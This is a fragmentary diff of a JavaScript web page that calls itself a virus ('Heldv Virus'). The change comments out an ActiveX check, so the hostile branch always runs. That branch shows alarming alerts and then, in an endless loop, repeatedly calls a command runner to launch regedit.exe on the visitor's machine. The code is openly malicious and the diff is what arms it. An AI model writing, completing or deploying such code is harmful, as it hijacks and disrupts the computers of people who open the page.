@@ -1,6 +1,6 @@
-if(typeof(window.ActiveXObject)=="undefined"){
-    alert("Sorry We Deleted This Virus");
-}else {
+//if(typeof(window.ActiveXObject)=="undefined"){
+ //   alert("Sorry We Deleted This Virus");
+//}else {
     alert("Are You Sure About This If You Not Sure About This Close This Page!");
     alert("Ok Heldv Virus Starting!")
     function runCmd(command, option)
@@ -26,6 +26,6 @@ while(true){
     runCmd("regedit.exe","yemm")
 }
 
-}
+//}
 
 
